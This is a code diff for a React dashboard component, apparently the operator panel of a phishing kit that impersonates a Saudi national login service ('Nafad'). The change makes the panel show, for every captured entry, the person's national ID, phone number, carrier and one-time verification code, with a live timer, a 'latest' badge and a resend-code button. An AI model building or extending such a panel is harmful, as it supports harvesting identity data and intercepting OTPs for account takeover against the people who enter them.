@@ -2485,46 +2485,70 @@ const renderNafadBox = () => {
       });
     }
     
-    if (hasPhoneData && phoneRaw) {
+    // Create a box for each entry that has Phone data
+    customerEntryGroup.forEach((entry, index) => {
+      const raw = entry.raw || {};
+      const hasPhone = raw.phoneNumber || raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
+      const entryTimestamp = new Date(raw._v7UpdatedAt || raw.phoneSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      const isLatest = index === 0;
+      
+      // Check if this entry has phone data
+      if (!hasPhone) return;
+      
       boxes.push({
-        key: 'phone',
-        timestamp: phoneTimestamp,
+        key: `phone-${entry.id}`,
+        timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: "1px solid #e5e7eb",
+            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={phoneTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <TimeCounter timestamp={entryTimestamp} />
+            {isLatest && (
+              <span style={{
+                position: "absolute",
+                top: 8,
+                right: 8,
+                background: "#3b82f6",
+                color: "#fff",
+                padding: "2px 8px",
+                borderRadius: 4,
+                fontSize: "0.65rem",
+                fontWeight: 600
+              }}>
+                الأحدث
+              </span>
+            )}
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
             </div>
-            {phoneRaw.phoneIdNumber && (
+            {raw.phoneIdNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneIdNumber}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneIdNumber}</span>
               </div>
             )}
-            {phoneRaw.phoneNumber && (
+            {raw.phoneNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneNumber}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
               </div>
             )}
-            {phoneRaw.phoneCarrier && (
+            {raw.phoneCarrier && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة الاتصالات</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneCarrier}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneCarrier}</span>
               </div>
             )}
-            {(phoneRaw.phoneOtp || phoneRaw._v7) && (
+            {(raw.phoneOtp || raw._v7) && (
               <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
-                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneRaw.phoneOtp || phoneRaw._v7}</p>
+                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
               </div>
             )}
             {/* زر إعادة إرسال الرمز */}
@@ -2555,7 +2579,7 @@ const renderNafadBox = () => {
           </div>
         )
       });
-    }
+    });
     
     if (hasNafadData && nafadRaw) {
       boxes.push({
